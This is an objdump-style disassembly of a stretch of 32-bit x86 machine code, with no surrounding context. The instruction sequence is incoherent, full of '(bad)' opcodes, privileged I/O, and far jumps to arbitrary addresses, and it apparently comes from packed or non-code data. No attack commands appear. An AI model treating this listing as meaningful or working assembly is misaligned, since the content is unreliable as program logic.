  41538e:	push   esp
  41538f:	xchg   esp,eax
  415390:	mov    eax,ds:0x6322cae8
  415395:	pop    edx
  415396:	(bad)  
  415398:	imul   ebx,DWORD PTR [ebx-0x1c],0xc99dc671
  41539f:	xor    al,0x6a
  4153a1:	scas   eax,DWORD PTR es:[edi]
  4153a2:	outs   dx,BYTE PTR ds:[esi]
  4153a3:	dec    ecx
  4153a4:	scas   eax,DWORD PTR es:[edi]
  4153a5:	inc    ecx
  4153a6:	jne    0x415354
  4153a8:	cli    
  4153a9:	int    0xb2
  4153ab:	out    dx,al
  4153ac:	and    eax,0x7ce9fafc
  4153b1:	nop
  4153b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4153b3:	and    al,0x15
  4153b5:	pop    eax
  4153b6:	test   al,0x6
  4153b8:	arpl   WORD PTR [edx],bx
  4153ba:	je     0x4153c1
  4153bc:	jg     0x4153fc
  4153be:	leave  
  4153bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153c0:	push   es
  4153c1:	(bad)  
  4153c3:	clc    
  4153c4:	cdq    
  4153c5:	add    BYTE PTR [esi],ch
  4153c7:	sbb    DWORD PTR [ebp-0x27eae9c8],0x735c68ff
  4153d1:	enter  0x28f9,0xa
  4153d5:	xlat   BYTE PTR ds:[ebx]
  4153d6:	stos   DWORD PTR es:[edi],eax
  4153d7:	mov    eax,0xb8701d1e
  4153dc:	jns    0x4153de
  4153de:	mov    ?,WORD PTR [ebx-0x1784b528]
  4153e4:	js     0x41545f
  4153e6:	cmp    esp,DWORD PTR [edx-0x36]
  4153e9:	jmp    0x3c6f289e
  4153ee:	jmp    0x415448
  4153f0:	xchg   esi,eax
  4153f1:	lock lds eax,FWORD PTR ds:0x5b36fd71
  4153f8:	sub    al,0xba
  4153fa:	cli    
  4153fb:	and    al,0xda
  4153fd:	pop    eax
  4153fe:	call   0xab6d:0x1c30d911
  415405:	xor    bh,dl
  415407:	daa    
  415408:	or     BYTE PTR [eax-0x5a],0x72
  41540c:	add    DWORD PTR [ebx+eax*2+0x7789764c],edi
  415413:	ja     0x4153b3
  415415:	ret    0x39b3
  415418:	push   eax
  415419:	xchg   esi,eax
  41541a:	xchg   edx,eax
  41541b:	push   es
  41541c:	or     edx,0xeac1d4e4
  415422:	fld    DWORD PTR [eax+edi*4]
  415425:	xor    al,0xa3
  415427:	inc    esp
  415428:	rcl    BYTE PTR [eax+0x7f],1
  41542b:	pop    esi
  41542c:	inc    esi
  41542d:	in     eax,0xd5
  41542f:	addr16 add al,0x42
  415432:	mov    DWORD PTR [ebp-0x39],esi
  415435:	adc    al,0x1
  415437:	and    dh,BYTE PTR [ebx+0xae35016]
  41543d:	cmp    BYTE PTR [edi-0x73],0xfd
  415441:	dec    esp
  415442:	lock dec esp
  415444:	cmp    al,0x7d
  415446:	adc    al,0xbb
  415448:	jmp    0xd9648e50
  41544d:	and    dl,BYTE PTR [ecx+0x6dbe86b6]
  415453:	test   BYTE PTR [esi-0x18],bh
  415456:	xor    bh,dl
  415458:	cmp    eax,0xca7b62a8
  41545d:	jnp    0x4154ab
  41545f:	pop    ebp
  415460:	xor    DWORD PTR [esi+0x27],ebp
  415463:	stos   DWORD PTR es:[edi],eax
  415464:	fisub  WORD PTR [ebp-0x21283a64]
  41546a:	fsub   DWORD PTR [ecx-0xe]
  41546d:	xchg   edi,eax
  41546e:	jl     0x415488
  415470:	pop    eax
  415471:	jns    0x4154f0
  415473:	outs   dx,DWORD PTR ds:[esi]
  415474:	adc    ebp,DWORD PTR [esi]
  415476:	sbb    eax,0xa4dac3f1
  41547b:	sbb    ecx,DWORD PTR [ebp+0x44]
  41547e:	jp     0x4154f6
  415480:	stos   BYTE PTR es:[edi],al
  415481:	es int3 
  415483:	imul   eax,DWORD PTR [ebx-0x2c9e7e53],0x335d390e
  41548d:	push   0xd248957b
  415492:	and    BYTE PTR [ecx],bh
  415494:	mov    ecx,0xa4c9f54f
  415499:	repnz and ecx,eax
  41549c:	or     dh,0xaf
  41549f:	add    al,0x3c
  4154a1:	(bad)
  4154a5:	and    eax,0x8579dc68
  4154aa:	inc    esp
  4154ab:	fidiv  DWORD PTR [ecx*1-0x1e3a4820]
  4154b2:	aaa    
  4154b3:	ret    0x6492
  4154b6:	mov    cl,0xba
  4154b8:	dec    esp
  4154b9:	add    al,0x53
  4154bb:	or     al,0x44
  4154bd:	jne    0x4154ef
  4154bf:	or     BYTE PTR [ebp-0x23],al
  4154c2:	add    DWORD PTR ds:0x58abf3f0,ebx
  4154c8:	dec    edi
  4154c9:	les    ebp,FWORD PTR [eax+0x58d86f6b]
  4154cf:	rcr    BYTE PTR [edi-0x316cc0ed],cl
  4154d5:	pop    ss
  4154d6:	push   0x2a
  4154d8:	jmp    0xaee8c94
  4154dd:	pushf  
  4154de:	cmp    ch,bh
  4154e0:	std    
  4154e1:	cld    
  4154e2:	add    eax,0xbd5da31e
  4154e7:	jo     0x4154cb
  4154e9:	icebp  
  4154ea:	es stos DWORD PTR es:[edi],eax
  4154ec:	clc    
  4154ed:	adc    esi,DWORD PTR [eax+0xf]
  4154f0:	mov    ss,WORD PTR [ebp-0x36]
  4154f3:	test   al,0xc2
  4154f5:	sbb    BYTE PTR [ecx+0x4a064a2d],bh
  4154fb:	push   ebp
  4154fc:	mov    ebx,0xfa989ad9
  415501:	fs pop ebx
  415503:	mov    ecx,0xdcaee6db
  415508:	lock adc DWORD PTR [edx+0x5f14a996],esi
  41550f:	or     cl,BYTE PTR [ebp+0x5c]
  415512:	cmp    al,0x6a
  415514:	outs   dx,DWORD PTR ds:[esi]
  415515:	(bad)  
  415516:	mov    edx,0xcd8c3047
  41551b:	inc    esp
  41551c:	(bad)  
  41551d:	mov    ebx,0xe53a0fb9
  415522:	mov    ebx,esi
  415524:	aaa    
  415525:	fisub  DWORD PTR [ebx]
  415527:	adc    al,0xca
  415529:	mov    eax,0x6fc2ede6
  41552e:	jge    0x4154ef
  415530:	cli    
  415531:	(bad)  
  415532:	or     esi,esi
  415534:	mov    bp,0xbbd8
  415538:	test   eax,0x2b30f782
  41553d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41553e:	xor    DWORD PTR [eax],ebx
  415540:	jge    0x415555
  415542:	pop    edi
  415543:	dec    eax
  415544:	and    eax,ebp
  415546:	outs   dx,DWORD PTR ds:[esi]
  415547:	and    ecx,DWORD PTR [ebx-0x22b0f2b8]
  41554d:	outs   dx,BYTE PTR ds:[esi]
  41554e:	(bad)  
  41554f:	call   0xbe72704e
  415554:	adc    DWORD PTR [eax+ebp*4],0x76
  415558:	jg     0x41558c
  41555a:	and    BYTE PTR [ecx-0x79c64209],dl
  415560:	mov    ebp,0xcd41fd22
  415565:	mov    edx,0xfcf8cde0
  41556a:	xor    eax,0xccd983f7
  41556f:	pop    ss
  415570:	push   esp
  415571:	mov    bh,dl
  415573:	ret    0x7a51
  415576:	dec    ecx
  415577:	(bad)  
  415578:	daa    
  415579:	add    ch,cl
  41557b:	les    edi,FWORD PTR [esi]
  41557d:	or     al,0xb5
  41557f:	and    esp,DWORD PTR [eax-0x56ed05e6]
  415585:	or     BYTE PTR [ebp-0x5c256196],ah
  41558b:	xchg   ebx,eax
  41558c:	jmp    0x415571
  41558e:	mov    dh,0x70
  415590:	xchg   esp,eax
  415591:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415592:	inc    edi
  415593:	xlat   BYTE PTR ds:[ebx]
  415594:	fs dec ecx
  415596:	in     al,dx
  415597:	leave  
  415598:	das    
  415599:	jmp    0x41555a
  41559b:	lahf   
  41559c:	enter  0x2510,0x39
  4155a0:	or     edi,DWORD PTR es:[edx-0x79]
  4155a4:	cmc    
  4155a5:	add    edx,DWORD PTR [edx+0x3e]
  4155a8:	nop
  4155a9:	jl     0x415585
  4155ab:	imul   esp,DWORD PTR [edx+0x44061645],0xffffffec
  4155b2:	repnz clc 
  4155b4:	ja     0x415588
  4155b6:	pushf  
  4155b7:	mov    ah,0xff
  4155b9:	(bad)  
  4155ba:	bound  eax,QWORD PTR [ebx+0x74]
  4155bd:	jbe    0x415583
  4155bf:	cmp    al,0x88
  4155c1:	mov    esp,0xe1166964
  4155c6:	jo     0x41558d
  4155c8:	and    esp,ebp
  4155ca:	(bad)  
  4155cb:	test   eax,0xd52e3bcf
  4155d0:	xor    edx,DWORD PTR [edx-0x7a]
  4155d3:	jle    0x41556c
  4155d5:	or     edx,eax
  4155d7:	call   0x66a2d52
  4155dc:	bound  eax,QWORD PTR [edx+0x3]
  4155df:	pop    ecx
  4155e0:	inc    ecx
  4155e1:	data16 sar BYTE PTR [edi+edx*8-0x3747787f],cl
  4155e9:	outs   dx,BYTE PTR ds:[esi]
  4155ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4155eb:	shl    BYTE PTR [edi+0x21],1
  4155ee:	pop    esi
  4155ef:	hlt    
  4155f0:	pop    ebx
  4155f1:	(bad)  
  4155f2:	shr    BYTE PTR fs:[esi-0x6b345ba6],1
  4155f9:	mov    bl,0xe1
  4155fb:	out    dx,al
  4155fc:	dec    edx
  4155fd:	or     BYTE PTR [esi],bl
  4155ff:	push   esi
  415600:	and    al,0xf9
  415602:	jns    0x41561b
  415604:	cmp    dl,BYTE PTR [eax-0x1f]
  415607:	aas    
  415608:	lock gs push edx
  41560b:	pop    ss
  41560c:	adc    eax,0xb5f75d2a
  415611:	dec    ebp
  415612:	leave  
  415613:	jo     0x41561a
  415615:	lock sahf 
  415617:	js     0x4155b5
  415619:	mov    ecx,0x8a9d80a8
  41561e:	test   BYTE PTR [ebp+0x19],0x16
  415622:	sub    eax,0x413b714b
  415627:	loopne 0x4155c7
  415629:	or     edi,DWORD PTR [ecx+0x2d]
  41562c:	sub    DWORD PTR [esi-0x4a],ecx
  41562f:	fwait
  415630:	imul   ecx,edi,0x35
  415633:	out    dx,eax
  415634:	or     al,0x52
  415636:	fisub  WORD PTR [esi-0x3399e59c]
  41563c:	ds xchg esp,eax
  41563e:	pop    esi
  41563f:	inc    esi
  415640:	mov    bl,0x11
  415642:	stos   DWORD PTR es:[edi],eax
  415643:	sub    esp,DWORD PTR [ebx]
  415645:	int    0xfc
  415647:	xchg   esi,eax
  415648:	and    BYTE PTR [ecx+0x74],dl
  41564b:	inc    edi
  41564c:	bound  esi,QWORD PTR [edi]
  41564e:	or     DWORD PTR [edx],edx
  415650:	push   cs
  415651:	test   BYTE PTR [ebx+ecx*4],bl
  415654:	scas   al,BYTE PTR es:[edi]
  415655:	jle    0x41564c
  415657:	sar    eax,cl
  415659:	xchg   edi,eax
  41565a:	sbb    DWORD PTR [eax],eax
  41565c:	xor    DWORD PTR [ebx+esi*1],esi
  41565f:	scas   eax,DWORD PTR es:[edi]
  415660:	and    BYTE PTR [ecx+0xa],0xa8
  415664:	jg     0x41562e
  415666:	pop    edi
  415667:	jl     0x4156d0
  415669:	imul   eax
  41566b:	aad    0xc
  41566d:	sahf   
  41566e:	mov    ds:0x2d65fb4e,al
  415673:	enter  0xbbba,0x74
  415677:	and    ecx,DWORD PTR [eax+eiz*2]
  41567a:	int3   
  41567b:	ins    DWORD PTR es:[edi],dx
  41567c:	mov    ds:0xcdbaece8,al
  415681:	xor    esp,DWORD PTR [eax+0x72]
  415684:	sbb    DWORD PTR [edi-0x527e7229],eax
  41568a:	mov    dh,0x58
  41568c:	dec    ecx
  41568d:	outs   dx,DWORD PTR ds:[esi]
  41568e:	and    BYTE PTR ds:0xb2ecc0c6,bh
  415694:	dec    ebx
  415695:	or     DWORD PTR [edx-0x6b],ebp
  415698:	ror    BYTE PTR [ecx-0x7c34be6a],cl
  41569e:	ja     0x4156ee
  4156a0:	cwde   
  4156a1:	xchg   edi,eax
  4156a2:	add    eax,0xc7f8045e
  4156a7:	stc    
  4156a8:	imul   eax,DWORD PTR [edi],0xa77c34f8
  4156ae:	dec    ebp
  4156af:	mov    eax,ds:0x14097bd9
  4156b4:	ins    DWORD PTR es:[edi],dx
  4156b5:	es dec edx
  4156b7:	ror    BYTE PTR [esi+ecx*1+0x1f82bd99],0x9c
  4156bf:	sub    edi,DWORD PTR [ebp-0x5b99df88]
  4156c5:	and    eax,0xc134941e
  4156ca:	retf   0xeb0a
  4156cd:	inc    ecx
  4156ce:	xchg   ebx,eax
  4156cf:	sub    eax,0xc212597
  4156d4:	out    0x67,al
  4156d6:	mov    ds:0xeb2e7a4e,al
  4156db:	es inc ecx
  4156dd:	nop
  4156de:	xor    esp,edx
  4156e0:	hlt    
  4156e1:	and    edx,DWORD PTR [edx-0x6dd3588b]
  4156e7:	add    DWORD PTR [edx],edi
  4156e9:	xchg   edx,eax
  4156ea:	inc    ebp
  4156eb:	imul   esp,DWORD PTR [ebp+eax*1+0xb],0x2e
  4156f0:	(bad)  
  4156f2:	inc    ebp
  4156f3:	rol    dh,0x66
  4156f6:	es cld 
  4156f8:	dec    ebx
  4156f9:	lods   al,BYTE PTR ds:[esi]
  4156fa:	dec    eax
  4156fb:	lea    esi,[esi]
  4156fd:	jnp    0x4156dd
  4156ff:	push   es
  415700:	rcr    DWORD PTR [ebx+0xd],1
  415703:	fstp   QWORD PTR [ebx+eiz*1-0x93c5938]
  41570a:	jmp    0x4156b4
  41570c:	and    bl,BYTE PTR [edi+0x1a]
  41570f:	push   edx
  415710:	paddd  mm5,QWORD PTR [esi+0x76]
  415714:	arpl   WORD PTR [edi+0x64fe3c85],cx
  41571a:	mov    WORD PTR [ebx],ss
  41571c:	add    BYTE PTR [edx-0x28],bl
  41571f:	add    DWORD PTR [esi+0x34],eax
  415722:	mov    eax,ds:0x6308c28d
  415727:	fiadd  WORD PTR [ecx-0x12]
  41572b:	jns    0x4156e0
  41572d:	and    eax,0xeeea4262
  415732:	test   BYTE PTR [ebx],ah
  415734:	rcl    BYTE PTR [eax],cl
  415736:	aas    
  415737:	mul    dl
  415739:	xchg   DWORD PTR [ebp+0xf],ebp
  41573c:	xlat   BYTE PTR ds:[ebx]
  41573d:	lock pop ds
  41573f:	or     dh,BYTE PTR ds:0x1cd98da
  415745:	nop
  415746:	(bad)  
  415747:	fsub   QWORD PTR [ebp-0x45]
  41574a:	or     eax,0x73187414
  41574f:	pop    ds
  415750:	loopne 0x4156e4
  415752:	mov    ds:0x20156339,eax
  415757:	rol    al,0x78
  41575a:	(bad)  
  41575b:	aad    0x7c
  41575d:	inc    edi
  41575e:	inc    eax
  41575f:	sbb    cl,dh
  415761:	xor    ah,0x2
  415764:	pop    esp
  415765:	mov    bl,0x95
  415767:	mov    edx,0x9ecca743
  41576c:	leave  
  41576d:	rol    BYTE PTR [ecx+0x8ebef08],1
  415773:	and    bh,dh
  415775:	popf   
  415776:	cli    
  415777:	enter  0xe597,0x8f
  41577b:	mov    edx,0xf3452d10
  415780:	and    DWORD PTR [bx+di],ecx
  415783:	sbb    al,0xcc
  415785:	jecxz  0x4157bc
  415787:	xchg   DWORD PTR [eax+0x4a],edx
  41578a:	rcr    BYTE PTR [esi+eax*4+0x5403d8af],0x4f
  415792:	cmp    eax,0x17517725
  415797:	xor    DWORD PTR [edi+0x7eedf4e0],ebp
  41579d:	fidiv  WORD PTR [eax-0x25]
  4157a0:	addr16 ss jbe 0x4157f7
  4157a4:	stc    
  4157a5:	sub    dh,cl
  4157a7:	xchg   ebp,eax
  4157a8:	cmp    al,0x36
  4157aa:	cmp    DWORD PTR [edx+edx*1+0x7f],esi
  4157ae:	rcr    ebx,0x9c
  4157b1:	pop    es
  4157b2:	sub    al,0x6e
  4157b4:	mov    ebx,DWORD PTR [ebp+0x51]
  4157b7:	mov    al,ds:0x933e2abb
  4157bc:	out    0x88,al
  4157be:	or     dh,0xe3
  4157c1:	jbe    0x415832
  4157c3:	retf   
  4157c4:	sub    DWORD PTR [eax],ecx
  4157c6:	(bad)  
  4157c7:	dec    esi
  4157c8:	cwde   
  4157c9:	mov    ah,0xc0
  4157cb:	jle    0x415830
  4157cd:	out    0x81,al
  4157cf:	and    edx,esi
  4157d1:	loop   0x4157de
  4157d3:	inc    ebp
  4157d4:	push   ecx
  4157d5:	and    ecx,DWORD PTR ss:0x716ab2f8
  4157dc:	push   ds
  4157dd:	push   es
  4157de:	or     dh,ah
  4157e0:	pop    ebx
  4157e1:	in     al,0x10
  4157e3:	(bad)
  4157e6:	lods   eax,DWORD PTR ds:[esi]
  4157e7:	mov    ch,0xca
  4157e9:	loop   0x4157f6
  4157eb:	inc    esi
  4157ec:	jae    0x415814
  4157ee:	xlat   BYTE PTR ds:[ebx]
  4157ef:	fisttp DWORD PTR [ebx+0x27]
  4157f2:	cli    
  4157f3:	and    eax,DWORD PTR [ecx+0x4e]
  4157f6:	ja     0x415841
  4157f8:	cmp    eax,0x2ff32c63
  4157fd:	adc    BYTE PTR [edx-0xc],ch
  415800:	dec    edi
  415801:	aaa    
  415802:	fmulp  st(1),st
  415804:	adc    DWORD PTR [ebx],esi
  415806:	jb     0x415849
  415808:	push   esp
  415809:	pop    edi
  41580a:	repnz popf 
  41580c:	sbb    eax,0x5f869db2
  415811:	inc    ecx
  415812:	jg     0x4157fa
  415814:	jae    0x415869
  415816:	mov    dl,0x3c
  415818:	popa   
  415819:	add    al,0x20
  41581b:	imul   ebx,DWORD PTR [ecx],0x42ec76be
  415821:	aaa    
  415822:	ja     0x4157eb
  415824:	lds    esi,FWORD PTR [ecx-0x72a6b3a1]
  41582a:	les    esp,FWORD PTR [edi-0x59]
  41582d:	daa    
  41582e:	pop    ss
  41582f:	jmp    0xa414:0xba1ae3f
  415836:	xchg   ebx,eax
  415837:	pop    esp
  415838:	mov    ds:0xde32d962,al
  41583d:	sbb    eax,DWORD PTR [eax-0x4d]
  415840:	shl    DWORD PTR [ecx],0xf9
  415843:	pop    edx
  415844:	sub    ch,dl
  415846:	and    eax,0x8b65f482
  41584b:	mov    edi,ebp
  41584d:	int3   
  41584e:	loope  0x415812
  415850:	retf   
  415851:	fimul  DWORD PTR cs:[edi+edi*2-0x3e]
  415856:	sbb    eax,0xcb71b836
  41585b:	add    bl,ah
  41585d:	movsx  edi,BYTE PTR [esi+0x3dc26804]
  415864:	cmp    DWORD PTR [ebp-0x5165456a],0xffffffc7
  41586b:	js     0x41582d
  41586d:	(bad)  
  41586e:	sub    al,0xaa
  415870:	sbb    cl,BYTE PTR [eax+0x41]
  415873:	mov    bl,0xde
  415875:	mov    ds:0x8282ee20,al
  41587a:	dec    esp
  41587b:	rcr    DWORD PTR [ebx-0x5e8e8d39],1
  415881:	outs   dx,DWORD PTR ds:[esi]
  415882:	icebp  
  415883:	ja     0x4158c1
  415885:	and    edx,DWORD PTR [ecx+0x7b]
  415888:	inc    ebx
  415889:	popf   
  41588a:	(bad)  
  41588b:	fmul   QWORD PTR [edx+0x42]
  41588e:	mov    edi,DWORD PTR [eax]
  415890:	jl     0x9718c5ee
  415896:	mov    edx,ecx
  415898:	pop    es
  415899:	cmp    al,0x81
  41589b:	jmp    0xff71:0xa0374537
  4158a2:	cmp    bl,BYTE PTR [ebp-0x50]
  4158a5:	mov    ecx,0xe3b28699
  4158aa:	test   DWORD PTR [esi],0xb534f0d2
  4158b0:	mov    dh,0x1a
  4158b2:	mov    ds:0x9210d7aa,al
  4158b7:	inc    ecx
  4158b8:	stos   BYTE PTR es:[edi],al
  4158b9:	cmp    al,0xb6
  4158bb:	pop    edi
  4158bc:	loop   0x41584b
  4158be:	dec    ebp
  4158bf:	pop    edi
  4158c0:	xlat   BYTE PTR ds:[ebx]
  4158c1:	sbb    eax,0xbd57d30b
  4158c6:	inc    ecx
  4158c7:	push   edx
  4158c8:	xchg   edi,eax
  4158c9:	fbstp  TBYTE PTR [edi+esi*1-0x26470b9]
  4158d0:	jg     0x415914
  4158d2:	in     al,dx
  4158d3:	jbe    0x4158ee
  4158d5:	lods   al,BYTE PTR ds:[esi]
  4158d6:	cmc    
  4158d7:	sub    DWORD PTR ds:0x732148dc,edx
  4158dd:	dec    ebx
  4158de:	call   0x8a960009
  4158e3:	sub    al,0x87
  4158e5:	push   eax
  4158e6:	jo     0x415961
  4158e8:	or     al,0xa1
  4158ea:	adc    ah,ah
  4158ec:	inc    esp
  4158ed:	mov    edi,0xed470896
  4158f2:	pop    esi
  4158f3:	daa    
  4158f4:	mov    ebx,?
  4158f6:	int    0x7b
  4158f8:	and    al,0x42
  4158fa:	cmc    
  4158fb:	jo     0x415888
  4158fd:	shl    BYTE PTR [esi-0x716b7d74],cl
  415903:	mov    bh,0x3d
  415905:	enter  0xe95a,0x57
  415909:	leave  
  41590a:	inc    ebx
  41590b:	or     eax,0xcba8e236
  415910:	push   ecx
  415911:	dec    esi
  415912:	sub    BYTE PTR [edx+0x1e],dh
  415915:	fnstcw WORD PTR [edi+0x4c]
  415918:	pop    eax
  415919:	sbb    ah,BYTE PTR [eax+edi*1-0xb]
  41591d:	jl     0x415952
  41591f:	cmp    al,0x60
  415921:	rol    DWORD PTR [edi-0x6d8a8095],1
  415927:	iret   
  415928:	push   ecx
  415929:	add    edi,DWORD PTR [esi+0x5fdd78da]
  41592f:	cli    
  415930:	push   ds
  415931:	dec    eax
  415932:	cli    
  415933:	call   0x5a8c3020
  415938:	xor    al,0x35
  41593a:	push   cs
  41593b:	lahf   
  41593c:	pop    edx
  41593d:	xchg   ebp,eax
  41593e:	mov    cl,0x3e
  415940:	adc    dh,BYTE PTR [ebp+0x4c]
  415943:	outs   dx,BYTE PTR ds:[esi]
  415944:	mov    dl,0x4f
  415946:	jae    0x41592e
  415948:	adc    eax,0xccc28321
  41594d:	ror    DWORD PTR [edi+0x1c327080],1
  415953:	rcl    BYTE PTR [edx],0x19
  415956:	add    al,0xd5
  415958:	sub    al,0xc4
  41595a:	or     eax,0xad7f08d9
  41595f:	cmp    BYTE PTR [edx],al
  415961:	ficomp DWORD PTR [ecx]
  415963:	jae    0x4158eb
  415965:	sub    eax,0x100fdb00
  41596a:	push   0x68
  41596c:	call   0x76da495a
  415971:	adc    eax,0x42392152
  415976:	into   
  415977:	in     al,0x9e
  415979:	cld    
  41597a:	jne    0x4159ec
  41597c:	xor    dx,WORD PTR [ebx-0x280fde11]
  415983:	sbb    al,0x45
  415985:	or     al,0xe1
  415987:	stos   BYTE PTR es:[edi],al
  415988:	mov    edx,0x4caf28a1
  41598d:	mov    ch,0x47
  41598f:	loopne 0x4159ce
  415991:	jae    0x415924
  415993:	(bad)  
  415994:	adc    BYTE PTR [ecx-0x75],ah
  415997:	xchg   ebx,eax
  415998:	jno    0x415930
  41599a:	aas    
  41599b:	sar    esp,cl
  41599d:	rcr    DWORD PTR [esi+0x52],1
  4159a0:	aam    0x35
  4159a2:	aam    0xc4
  4159a4:	lahf   
  4159a5:	sbb    DWORD PTR [edi+0x1985aaa4],ecx
  4159ab:	pop    esi
  4159ac:	rcl    DWORD PTR [ebx],1
  4159ae:	fst    DWORD PTR [ecx+0x526fb52f]
  4159b4:	sub    DWORD PTR [edi+0x2ea9f6c1],ebx
  4159ba:	cdq    
  4159bb:	mov    cl,BYTE PTR [ebx-0x5ab1aa27]
  4159c1:	push   ss
  4159c2:	mov    DWORD PTR cs:[edx],0x79a97b3e
  4159c9:	aam    0xea
  4159cb:	enter  0x7d0e,0x6d
  4159cf:	enter  0xdf91,0xf7
  4159d3:	(bad)  
  4159d4:	retf   
  4159d5:	push   ebx
  4159d6:	cmp    dl,dh
  4159d8:	dec    esp
  4159d9:	sbb    dl,0x73
  4159dc:	xor    al,0x57
  4159de:	not    BYTE PTR [edi+0x16964809]
  4159e4:	push   ss
  4159e5:	push   ecx
  4159e6:	mov    ch,BYTE PTR [esp+esi*1]
  4159e9:	je     0x4159a2
  4159eb:	adc    DWORD PTR [edi],ebp
  4159ed:	jmp    0xe93c90a8
  4159f2:	xor    eax,DWORD PTR [eax]
  4159f4:	add    eax,0x5ff04761
  4159f9:	pop    ebp
  4159fa:	(bad)  
  4159fb:	fdivr  QWORD PTR [ecx]
  4159fd:	xor    dl,BYTE PTR [eax]
  4159ff:	pop    ecx
  415a00:	fwait
  415a01:	es xor al,0x67
  415a04:	xchg   DWORD PTR [edi],esp
  415a06:	int    0xc5
  415a08:	fstp   QWORD PTR [esi]
  415a0a:	jno    0x415a47
  415a0c:	mov    ebp,0x432caa04
  415a11:	cs cdq 
  415a13:	xchg   ebp,eax
  415a14:	data16 stos BYTE PTR es:[edi],al
  415a16:	and    BYTE PTR [esi+0x27],cl
  415a19:	not    bl
  415a1b:	fcomp  QWORD PTR [eax]
  415a1d:	stos   DWORD PTR es:[edi],eax
  415a1e:	pop    esp
  415a1f:	retf   0xfa7c
  415a22:	into   
  415a23:	loopne 0x415a1b
  415a25:	adc    edi,DWORD PTR [ebp-0x2893ebf0]
  415a2b:	jnp    0x415a1f
  415a2d:	jl     0x4159d9
  415a2f:	cmc    
  415a30:	test   BYTE PTR [ebp+0x7b],al
  415a33:	mov    esi,eax
  415a35:	jecxz  0x4159cf
  415a37:	jmp    0x415aa9
  415a39:	xchg   ebx,eax
  415a3a:	rcr    BYTE PTR [eax+0x1f],0xb
  415a3e:	xchg   ebx,eax
  415a3f:	fwait
  415a40:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a41:	mov    BYTE PTR [eax],cl
  415a43:	jo     0x415aa9
  415a45:	iret   
  415a46:	push   esi
  415a47:	bound  esp,QWORD PTR [esi]
  415a49:	push   0xfffffff8
  415a4b:	cmc    
  415a4c:	mov    ds:0xdb9f63ad,al
  415a51:	test   BYTE PTR [ebp-0x737bbb94],dl
  415a57:	mov    BYTE PTR [esp+eax*1],dl
  415a5a:	call   0x9313d94
  415a5f:	or     BYTE PTR [edi+0x55],0x98
  415a63:	aas    
  415a64:	xchg   ebp,eax
  415a65:	push   esp
  415a66:	out    0x68,al
  415a68:	mov    WORD PTR [eax+0x2db6e8da],fs
  415a6e:	pop    es
  415a6f:	xchg   edi,eax
  415a70:	and    al,0x50
  415a72:	pop    eax
  415a73:	mov    esp,0x7c76aed
  415a78:	pushf  
  415a79:	mov    ah,BYTE PTR ds:0x95db0231
  415a7f:	sbb    cl,dh
  415a81:	fadd   st(2),st
  415a83:	or     DWORD PTR [edx],edi
  415a85:	sbb    edx,DWORD PTR [ebx]
  415a87:	push   0xfffffff0
  415a89:	mov    ebx,0x6b1d667c
  415a8e:	dec    esi
  415a8f:	sub    eax,0x12c5e4cd
  415a94:	dec    ecx
  415a95:	fsub   DWORD PTR [ebp-0x72b6f007]
  415a9b:	and    eax,0xea6ced36
  415aa0:	es dec edi
  415aa2:	iret   
  415aa3:	ds adc ecx,ebp
  415aa6:	pop    ss
  415aa7:	jge    0x415b0a
  415aa9:	adc    DWORD PTR [esi-0x7d1ffda7],edx
  415aaf:	sbb    eax,0x70bd7f8a
  415ab4:	cmp    eax,DWORD PTR [eax]
  415ab6:	push   0xd62cb705
  415abb:	es je  0x415b12
  415abe:	or     dh,bl
  415ac0:	sar    BYTE PTR ss:[esi+0x63],0x1d
  415ac5:	in     al,0x34
  415ac7:	fld    TBYTE PTR [bp+0x13]
  415acb:	cwde   
  415acc:	jmp    0x415ad8
  415ace:	dec    eax
  415acf:	lods   eax,DWORD PTR ds:[esi]
  415ad0:	inc    esi
  415ad1:	call   0xb2b49c76
  415ad6:	out    dx,eax
  415ad7:	rcr    DWORD PTR [eax+0x2],0xf
  415adb:	xchg   BYTE PTR [eax+0x3c3a9c19],dl
  415ae1:	jmp    0x415b35
  415ae3:	inc    edi
  415ae4:	and    DWORD PTR [edx-0x3c58769f],ebp
  415aea:	or     al,0xed
  415aec:	sub    bl,bh
  415aee:	icebp  
  415aef:	mov    al,ds:0x9ee1b6ff
  415af4:	push   0x597e5021
  415af9:	out    dx,al
  415afa:	push   ss
  415afb:	xor    al,0x55
  415afd:	ret    
  415afe:	jl     0x415ab0
  415b00:	and    al,0xa4
  415b02:	retf   0x7c92
  415b05:	repnz xchg edx,eax
  415b07:	add    DWORD PTR [eax+0x2f34e2f9],edi
  415b0d:	leave  
  415b0e:	xchg   esi,eax
  415b0f:	cmp    eax,0x8d20474f
  415b14:	in     eax,dx
  415b15:	(bad)  
  415b16:	retf   0x6690
  415b19:	mov    DWORD PTR [eax-0x7],ecx
  415b1c:	cld    
  415b1d:	shr    esi,0xd2
  415b20:	pusha  
  415b21:	push   dx
  415b23:	sub    ch,0x6
  415b26:	push   edi
  415b27:	mov    eax,0xbd99c9d4
  415b2c:	les    ebx,FWORD PTR [edi-0x60116004]
  415b32:	push   esp
  415b33:	add    eax,0x40377da8
  415b38:	inc    edx
  415b39:	xchg   edx,eax
  415b3a:	jmp    0x4d04b181
  415b3f:	mov    bh,0x5c
  415b41:	outs   dx,DWORD PTR ds:[esi]
  415b42:	pop    ecx
  415b43:	pop    esp
  415b44:	jb     0x415ad5
  415b46:	dec    ecx
  415b47:	mov    edi,0xec42384f
  415b4c:	and    DWORD PTR [ebx+ecx*2+0x73],0x47
  415b51:	cli    
  415b52:	xchg   DWORD PTR ds:0x2cd54eb2,ebx
  415b58:	xor    dl,BYTE PTR [ebx]
  415b5a:	int3   
  415b5b:	cmp    dl,ah
  415b5d:	leave  
  415b5e:	or     dh,ah
  415b60:	adc    al,0xa0
  415b62:	out    dx,al
  415b63:	test   al,0xd4
  415b65:	call   0x8c56:0xec2d09f4
  415b6c:	cmp    BYTE PTR [edi+0x42],ah
  415b6f:	dec    esi
  415b70:	push   ebx
  415b71:	fs sbb al,0x2c
  415b74:	sub    BYTE PTR [ebp+0x29],bl
  415b77:	imul   ecx,DWORD PTR ds:0xf8d8f1ff,0x9
  415b7e:	and    al,BYTE PTR [edi-0x50]
  415b81:	add    al,0xb1
  415b83:	mov    eax,ds:0x6526ca59
